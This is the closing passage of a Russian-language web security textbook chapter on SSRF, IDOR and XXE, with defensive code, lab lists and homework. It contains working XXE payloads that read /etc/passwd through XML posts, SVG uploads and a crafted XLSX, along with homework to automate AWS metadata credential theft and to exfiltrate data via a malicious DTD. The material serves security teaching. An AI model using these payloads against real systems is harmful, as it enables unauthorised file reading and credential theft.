<root>&xxe;</root>"""
    
    # Попытка 1: Переключаем Content-Type на XML
    resp1 = requests.post(
        url,
        data=xxe_payload,
        headers={'Content-Type': 'application/xml'},
        timeout=10
    )
    if 'root:x:0:0' in resp1.text:
        print("[!] XXE через Content-Type: application/xml")
        return resp1.text
    
    # Попытка 2: text/xml
    resp2 = requests.post(
        url,
        data=xxe_payload,
        headers={'Content-Type': 'text/xml'},
        timeout=10
    )
    if 'root:x:0:0' in resp2.text:
        print("[!] XXE через Content-Type: text/xml")
        return resp2.text
    
    # Попытка 3: SVG upload (содержит XML)
    svg_payload = f"""<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""
    
    resp3 = requests.post(
        url,
        files={'file': ('evil.svg', svg_payload, 'image/svg+xml')},
        timeout=10
    )
    if 'root:x:0:0' in resp3.text:
        print("[!] XXE через SVG upload")
        return resp3.text
    
    print("[-] XXE не обнаружен")
    return None
```

### XXE в форматах документов

```python
# XXE в XLSX (Excel)
# XLSX — это ZIP-архив с XML файлами внутри
import zipfile
import shutil
import os

def create_malicious_xlsx(output_file: str):
    """Создание XLSX с XXE payload"""
    
    # Базовый XLSX (нужен валидный файл)
    shutil.copy("template.xlsx", output_file)
    
    # XXE payload для [Content_Types].xml
    xxe_content_types = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="&xxe;"/>
</Types>"""
    
    # Обновляем файл внутри ZIP
    with zipfile.ZipFile(output_file, 'a') as zf:
        zf.writestr('[Content_Types].xml', xxe_content_types)
    
    print(f"[+] Создан вредоносный XLSX: {output_file}")

# XXE в XML-based форматах: SVG, DOCX, PPTX, RSS, ATOM, WSDL, XSD
```

---

## 11.3.8 Mitigation — как защититься

### Защита от SSRF

```python
import ipaddress
import socket
from urllib.parse import urlparse
import requests

BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),   # Loopback
    ipaddress.ip_network('10.0.0.0/8'),    # Private
    ipaddress.ip_network('172.16.0.0/12'), # Private
    ipaddress.ip_network('192.168.0.0/16'), # Private
    ipaddress.ip_network('169.254.0.0/16'), # Link-local (metadata!)
    ipaddress.ip_network('::1/128'),        # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),       # IPv6 private
]

ALLOWED_SCHEMES = {'http', 'https'}

def is_safe_url(url: str) -> bool:
    """Проверяет URL на безопасность перед запросом"""
    try:
        parsed = urlparse(url)
        
        # 1. Проверяем схему
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False
        
        # 2. Разрешаем DNS
        hostname = parsed.hostname
        if not hostname:
            return False
        
        # 3. ВАЖНО: резолвим DNS и проверяем IP
        # (предотвращает DNS rebinding если проверять при каждом запросе)
        try:
            ip = socket.gethostbyname(hostname)
            ip_addr = ipaddress.ip_address(ip)
        except socket.gaierror:
            return False
        
        # 4. Проверяем против блокировок
        for blocked_range in BLOCKED_RANGES:
            if ip_addr in blocked_range:
                return False
        
        # 5. Whitelist если возможно
        # allowed_hosts = ['api.external-service.com', 'cdn.example.com']
        # if hostname not in allowed_hosts:
        #     return False
        
        return True
        
    except Exception:
        return False

def safe_fetch_url(url: str) -> bytes:
    """Безопасный fetch URL с защитой от SSRF"""
    if not is_safe_url(url):
        raise ValueError(f"URL не прошёл проверку безопасности: {url}")
    
    # Дополнительно: не следуем редиректам или проверяем их
    resp = requests.get(
        url, 
        timeout=5,
        allow_redirects=False,  # Отключаем автоследование
        headers={'User-Agent': 'SafeBot/1.0'}
    )
    
    # Проверяем редирект
    if resp.is_redirect:
        redirect_url = resp.headers.get('Location', '')
        if not is_safe_url(redirect_url):
            raise ValueError(f"Redirect на небезопасный URL: {redirect_url}")
    
    return resp.content
```

### Защита от IDOR

```python
# Принцип: всегда привязывайте запросы к текущему пользователю

# ПЛОХО:
def get_document(doc_id: int):
    return db.query("SELECT * FROM documents WHERE id = %s", [doc_id])

# ХОРОШО: привязка к пользователю
def get_document(doc_id: int, user_id: int):
    doc = db.query(
        "SELECT * FROM documents WHERE id = %s AND user_id = %s",
        [doc_id, user_id]
    ).fetchone()
    
    if not doc:
        raise PermissionError("Документ не найден или нет доступа")
    
    return doc

# Использование непредсказуемых ID
import uuid
import secrets

# UUID v4 — непредсказуем
doc_id = str(uuid.uuid4())

# Или криптографически случайный token
doc_token = secrets.token_urlsafe(32)
```

### Защита от XXE

```python
# Безопасная обработка XML в Python
import xml.etree.ElementTree as ET
from defusedxml import ElementTree as DefusedET

# УЯЗВИМО:
def parse_xml_vulnerable(xml_string: str):
    return ET.fromstring(xml_string)  # Уязвим к XXE!

# БЕЗОПАСНО: используем defusedxml
def parse_xml_safe(xml_string: str):
    # defusedxml отключает: entity expansion, external entities, DTD processing
    return DefusedET.fromstring(xml_string)

# pip install defusedxml
```

```php
<?php
// Безопасная обработка XML в PHP

// УЯЗВИМО:
$doc = new DOMDocument();
$doc->loadXML($xml);  // XXE возможен!

// БЕЗОПАСНО:
$doc = new DOMDocument();
// Отключаем загрузку внешних entity
libxml_disable_entity_loader(true);
// Отключаем external subsets
$doc->loadXML($xml, LIBXML_NONET | LIBXML_DTDATTR | LIBXML_NOENT);

// Для PHP 8.0+: libxml_disable_entity_loader устарела
// Используйте: libxml_set_external_entity_loader(null);
```

```java
// Java — безопасная обработка XML
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Отключаем XXE
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
```

---

## 11.3.9 PortSwigger Labs — практика

### SSRF Labs

| Lab | Сложность | Описание |
|-----|-----------|----------|
| Basic SSRF against local server | Apprentice | SSRF через stock check функцию |
| Basic SSRF against backend system | Apprentice | Сканирование внутренней сети |
| SSRF with blacklist-based filter bypass | Practitioner | Обход блокировки 127.0.0.1 |
| SSRF with whitelist-based filter bypass | Practitioner | Обход whitelist с @, # |
| SSRF via open redirection | Practitioner | Цепочка с open redirect |
| Blind SSRF with out-of-band detection | Practitioner | Burp Collaborator |
| Blind SSRF with Shellshock | Expert | Эксплуатация Shellshock через SSRF |

```
Ссылка: https://portswigger.net/web-security/ssrf
```

### IDOR Labs

```
https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter
https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids
https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect
```

### XXE Labs

| Lab | Сложность |
|-----|-----------|
| Exploiting XXE using external entities to retrieve files | Apprentice |
| Exploiting XXE to perform SSRF attacks | Apprentice |
| Blind XXE with out-of-band interaction | Practitioner |
| Blind XXE with out-of-band interaction via XML parameter entities | Practitioner |
| Exploiting blind XXE to exfiltrate data using a malicious external DTD | Practitioner |
| Exploiting blind XXE to retrieve data via error messages | Practitioner |
| Exploiting XXE to retrieve data by repurposing a local DTD | Expert |

```
Ссылка: https://portswigger.net/web-security/xxe
```

---

## 📌 Итоги главы

- **SSRF** позволяет использовать сервер как прокси для атак на внутреннюю инфраструктуру. Ключевые техники обхода: вариации localhost, DNS rebinding, open redirects, протоколы gopher/file/dict.
- **Облачные метаданные** (169.254.169.254) — главная цель SSRF в cloud: AWS IAM credentials, GCP OAuth tokens, Azure Managed Identity.
- **Blind SSRF** обнаруживается через out-of-band взаимодействия: Burp Collaborator, interactsh, собственный сервер.
- **IDOR** — нарушение контроля доступа к объектам. Всегда проверяйте, что запрошенный объект принадлежит текущему пользователю. Sequential ID наиболее уязвимы.
- **XXE** использует обработку внешних XML сущностей для чтения файлов и SSRF. Для защиты — отключайте DTD processing и используйте defusedxml.

---

## 🏠 Домашнее задание

1. **SSRF**: Пройти все Apprentice и Practitioner SSRF лабы на PortSwigger. Написать Python-скрипт, автоматизирующий эксплуатацию AWS metadata через SSRF.

2. **IDOR**: Создать тестовое Flask-приложение с IDOR-уязвимостью в API, затем написать скрипт для её автоматического обнаружения.

3. **XXE**: Пройти все XXE лабы на PortSwigger. Создать evil.dtd для blind XXE и развернуть локальный сервер для приёма эксфильтрованных данных.

4. **Комплексное задание**: Запустить DVWA или WebGoat, найти SSRF/IDOR/XXE уязвимости, написать подробный write-up с PoC кодом.

---

## 🔗 Полезные ресурсы

| Ресурс | Описание |
|--------|----------|
| https://portswigger.net/web-security/ssrf | PortSwigger SSRF Academy |
| https://portswigger.net/web-security/xxe | PortSwigger XXE Academy |
| https://github.com/swisskyrepo/PayloadsAllTheThings | Огромная коллекция payload'ов |
| https://github.com/projectdiscovery/interactsh | OOB инструмент для blind SSRF/XXE |
| https://github.com/tarunkant/Gopherus | Генератор Gopher payload'ов |
| https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery | HackTricks SSRF |
| https://github.com/advisories | GitHub Security Advisories — реальные CVE |
| https://0xdf.gitlab.io/ | Write-ups для HTB |
| https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html | OWASP SSRF Cheat Sheet |
